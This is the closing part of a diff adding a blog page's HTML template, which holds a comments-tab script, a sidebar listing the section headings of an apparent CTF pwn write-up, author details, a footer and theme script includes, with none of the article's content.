+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hello-pwn"><span class="nav-number">2.</span> <span class="nav-text">hello pwn</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level0"><span class="nav-number">3.</span> <span class="nav-text">level0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level2"><span class="nav-number">4.</span> <span class="nav-text">Level2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#guess-num"><span class="nav-number">5.</span> <span class="nav-text">guess_num</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#int-overflow"><span class="nav-number">6.</span> <span class="nav-text">int_overflow</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cgpwn2"><span class="nav-number">7.</span> <span class="nav-text">cgpwn2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level3"><span class="nav-number">8.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CGfsb"><span class="nav-number">9.</span> <span class="nav-text">CGfsb</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Y0ng"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">109</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Y0ng</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
